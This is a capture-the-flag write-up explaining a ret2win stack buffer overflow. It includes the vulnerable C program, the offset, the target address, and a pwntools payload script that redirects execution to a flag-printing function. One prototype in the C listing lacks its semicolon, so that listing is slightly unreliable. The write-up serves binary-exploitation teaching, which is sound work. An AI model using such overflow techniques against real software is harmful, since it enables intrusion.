# Ret2Win — Stack Buffer Overflow Exploitation

## Overview

This challenge demonstrates a classic stack-based buffer overflow vulnerability leading to **control flow hijacking (ret2win)**. The goal is to redirect program execution to a hidden function (`_secret`) to retrieve the flag.

---

## Vulnerable Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void _bof(char *buff)
void _secret();


int main(int argc, char *argv[]){
    _bof(argv[1]);
    printf("Done.\n");
    return 0;
}

void _bof(char *buff){
    char buffer[1024];
    strcpy(buffer, buff);
    printf("Entered: %s\n", buffer);
}

void _secret(){
    system("cat flag.txt");
}
```

---

## Vulnerability

The vulnerability exists in:

```c
strcpy(buffer, buff);
```

- `strcpy()` does not perform bounds checking
- Input larger than 1024 bytes overwrites adjacent stack memory
- This leads to **overwrite of saved return address (EIP)**

---

## Exploitation Concept

The attack is based on:

```
Buffer Overflow → Overwrite EIP → Redirect execution → _secret()
```

---

## Memory Layout (Simplified)

```
| buffer (1024 bytes) |
| saved EBP           |
| saved EIP           |  ← overwritten
```

---

## Exploitation Steps

### 1. Find Offset

The return address is overwritten after approximately:

```
1036 bytes
```

---

### 2. Find Target Function

```bash
_secret() = 0x080491e7
```

---

### 3. Build Payload

```python
from pwn import *

offset = 1036
win = 0x080491e7

payload = b"A" * offset + p32(win)

p = process(["./ret2win", payload])
p.interactive()
```

---

## Result

When executed successfully:

```
flag{ret2win_success}
```

---

## Key Concepts Learned

- Stack buffer overflow
- Return address overwrite (EIP control)
- ret2win exploitation technique
- Basic binary exploitation workflow
- Debugging with GDB and pwntools

---

## Takeaway

This is a foundational binary exploitation scenario where control flow is redirected to a hidden function by overwriting the stack return address. It is the first step toward advanced topics like:

- ret2libc
- ROP chains
- ASLR bypass